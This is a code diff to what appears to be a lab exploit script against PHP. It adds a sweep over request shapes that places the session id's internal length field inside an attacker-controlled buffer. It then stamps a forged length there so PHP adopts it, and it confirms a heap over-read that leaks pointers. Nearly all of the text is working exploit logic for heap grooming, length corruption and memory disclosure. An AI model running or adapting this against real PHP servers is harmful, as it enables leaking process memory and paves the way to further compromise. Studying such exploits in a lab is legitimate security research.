@@ -227,32 +227,43 @@ def mode_containment(args):
     return found
 
 
-def scout(args, vsize, fields=73):
-    """Learn where PS(id) lands *before* building the payload that must aim at it.
+CONFIGS = [(73, 256), (73, 512), (73, 1024), (73, 4096), (16, 8192), (8, 16384)]
 
-    The stamp band cannot be a constant: the containment offset moves with the
-    size class, and hardcoding one measurement is why an earlier run stamped a
-    band the pointer was no longer in. PS(id) is a property of the previous
-    (OOM'd) request, so one scout request predicts the next request's landing.
+
+def sweep_containment(args, reps=1, label="  "):
+    """Which consumer shapes put PS(id)+0x10 inside a buffer we control?
+
+    Shape discovery has to be redone per mode rather than assumed. The landing
+    depends on the pool's *accumulated history*, not just on the current request:
+    a warmed pool (several shapes already through it) reliably lands PS(id) at one
+    address, while the same request on a fresh pool lands somewhere else entirely.
+    Assuming a shape -- `vsize=1024` -- is what made an earlier claim run adopt
+    nothing while containment mode was simultaneously reporting +0x138.
+
+    Returns [(fields, vsize, offset), ...] for shapes whose containment is usable.
     """
-    try:
-        raw, chunk = after_oom(args.port, args.log, consumer(vsize, fields=fields, fill=0x50))
-    except ServerGone:
-        print("  scout: server died before it could measure")
-        return None
-    pid, bufs = parse(chunk)
-    if pid is None or not bufs:
-        print("  scout: no probe output -- binary instrumented? log path right?")
-        return None
-    hit = containing(bufs, pid + 0x10)
-    if hit is None:
-        print("  scout: PS(id)+0x10 is outside every controlled buffer at vsize=%d" % vsize)
-        return None
-    _addr, length, off = hit
-    print("  scout: PS(id)=0x%x is inside a %d-byte buffer at +0x%x;"
-          % (pid, length, off - 0x10))
-    print("         the len field PHP will read is at +0x%x of the value" % off)
-    return off
+    hits = []
+    for fields, vsize in CONFIGS:
+        body = consumer(vsize, fields=fields)
+        if len(body) > 1000000:
+            continue
+        for rep in range(reps):
+            try:
+                raw, chunk = after_oom(args.port, args.log, body)
+            except ServerGone:
+                return hits
+            pid, bufs = parse(chunk)
+            if pid is None or not bufs:
+                continue
+            hit = containing(bufs, pid + 0x10)
+            if hit:
+                _addr, length, off = hit
+                if off >= 0x18:
+                    hits.append((fields, vsize, off))
+                    print("%s%-7d %-9d len field inside a %d-byte buffer at +0x%x"
+                          % (label, fields, vsize, length, off))
+                    break
+    return hits
 
 
 def stamp_band(off):
@@ -265,14 +276,21 @@ def stamp_band(off):
 def mode_claim(args):
     print("### claim -- write a length into the contained buffer, see if it is adopted")
     print()
-    off = scout(args, 1024)
-    band = stamp_band(off) if off is not None else STAMP_BAND
-    if off is None:
-        print("  scout failed; using the band measured when this lab was built")
-    print("  stamping 0x%x at every 8-aligned offset in [0x%x, 0x%x) of a 1024-byte value"
+    hits = sweep_containment(args, reps=1)
+    if not hits:
+        print("  could not place PS(id)+0x10 inside a controlled buffer on this pool,")
+        print("  so there is nothing to aim at and no claim can be adopted here.")
+        print()
+        print("RESULT claim 0")
+        return 0
+    fields, vsize, off = hits[0]
+    band = stamp_band(off)
+    print("  aiming with fields=%d, vsize=%d: the len field is at +0x%x of the value"
+          % (fields, vsize, off))
+    print("  stamping 0x%x at every 8-aligned offset in [0x%x, 0x%x)"
           % (CLAIM, band[0], band[1]))
     print()
-    body = consumer(1024, stamp=(band[0], band[1], CLAIM))
+    body = consumer(vsize, fields=fields, stamp=(band[0], band[1], CLAIM))
     adopted = 0
     print("  %-6s %-10s %s" % ("rep", "id len", "verdict"))
     for rep in range(args.reps):
@@ -306,9 +324,19 @@ def mode_leak(args):
     print("  Closed with one inequality: every leaked pointer must lie beyond the end of")
     print("  the buffer the read started in.")
     print()
-    off = scout(args, 1024)
-    band = stamp_band(off) if off is not None else STAMP_BAND
-    body = consumer(1024, fill=0x40, stamp=(band[0], band[1], CLAIM))
+    hits = sweep_containment(args, reps=1)
+    if not hits:
+        print("  could not place PS(id)+0x10 inside a controlled buffer on this pool,")
+        print("  so there is nothing to aim at and no over-read to confirm here.")
+        print()
+        print("RESULT leak 0")
+        return 0
+    fields, vsize, off = hits[0]
+    band = stamp_band(off)
+    print("  aiming with fields=%d, vsize=%d: the len field is at +0x%x of the value"
+          % (fields, vsize, off))
+    print()
+    body = consumer(vsize, fields=fields, fill=0x40, stamp=(band[0], band[1], CLAIM))
     leaks = 0
     for rep in range(args.reps):
         try:
@@ -323,7 +351,7 @@ def mode_leak(args):
             continue
         print("  " + "-" * 70)
         print("  rep %d: emitted id len=%d" % (rep, len(sid)))
-        if len(sid) <= 1024:
+        if len(sid) <= vsize:
             print("        no over-read this run (id not longer than our buffer)")
             continue
 
